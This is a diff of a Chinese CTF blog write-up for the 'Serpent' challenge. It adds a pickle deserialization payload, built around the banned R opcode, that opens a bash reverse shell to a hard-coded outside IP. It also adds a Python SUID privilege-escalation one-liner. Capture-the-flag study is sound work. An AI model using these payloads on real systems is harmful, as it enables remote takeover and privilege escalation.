@@ -248,7 +248,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">1.1k字</span>
+        <span class="post-count">1.2k字</span>
       </span>
     </span>
 
@@ -417,7 +417,7 @@
 <p><img src="/blog/2023/09/02/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20230902125522191.png" alt="image-20230902125522191"></p>
 <hr>
 <h2 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h2><blockquote>
-<p>jwt+pickle反序列化R绕过</p>
+<p>jwt+pickle反序列化R绕过+python提权</p>
 </blockquote>
 <p>访问&#x2F;<a target="_blank" rel="noopener" href="http://www.zip下载源码/">www.zip下载源码</a></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session
@@ -494,7 +494,20 @@
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
     app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>接下来就是pickle反序列化了，<del>但是我还没学</del></p>
+<p>接下来就是pickle反序列化了，</p>
+<p>可以看到有个check函数，大佬们的wp是R指令绕过反弹shell，应该是R指令被ban了</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session
+<span class="token keyword">import</span> base64
+
+opcode<span class="token operator">=</span><span class="token triple-quoted-string string">b'''(cos
+system
+S'bash -c "bash -i >&amp; /dev/tcp/114.116.119.253/7777 &lt;&amp;1"'
+o.'''</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>opcode<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接下来是suid提权，直接看现成的payload：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3.8 <span class="token parameter variable">-c</span> <span class="token string">"import os;os.execl('/bin/sh','sh','-p')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <hr>
 <h2 id="ArkNights"><a href="#ArkNights" class="headerlink" title="ArkNights"></a>ArkNights</h2><p>源码</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> uuid
